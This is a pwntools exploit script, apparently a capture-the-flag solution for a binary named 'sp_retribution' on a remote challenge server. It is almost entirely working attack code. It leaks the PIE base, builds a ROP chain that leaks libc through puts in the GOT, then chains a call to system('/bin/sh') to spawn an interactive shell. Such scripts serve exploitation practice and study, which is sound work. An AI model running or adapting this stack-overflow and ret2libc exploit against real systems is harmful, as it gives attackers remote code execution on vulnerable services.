#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 134.209.20.90 --port 31705 ./sp_retribution
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sp_retribution')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '134.209.20.90'
port = int(args.PORT or 31705)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *missile_launcher+200
b *missile_launcher+141
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  './glibc/'

io = start()

libc = ELF("./libc.so.6")

io.sendlineafter(">> ","2")

io.recvuntil(", y = ")
p = "b"
io.sendafter("], y = ",p)

io.recvuntil(", y = ")
exe.address = u64(io.recvline()[:-1].ljust(8,"\x00")) - 0xd62
print(hex(exe.address))

rop = ROP([exe])
rop.raw("a"*8*11) 
rop.puts(exe.got['puts'])
rop.raw(p64(exe.sym['main']))
p = rop.chain()
io.sendlineafter(": ",p)

io.recvline()
io.recvline()
libc.address = u64(io.recvline()[:-1].ljust(8,"\x00"))  - libc.sym['puts']
print(hex(libc.address))

io.sendlineafter(">> ","2")

io.recvuntil(", y = ")
p = "b"
io.sendafter("], y = ",p)

rop = ROP([libc])
rop.raw("a"*8*11) 
rop.system(libc.search("/bin/sh\x00").next()) 
print(rop.dump())
p = rop.chain()
io.sendlineafter(": ",p)

io.interactive()

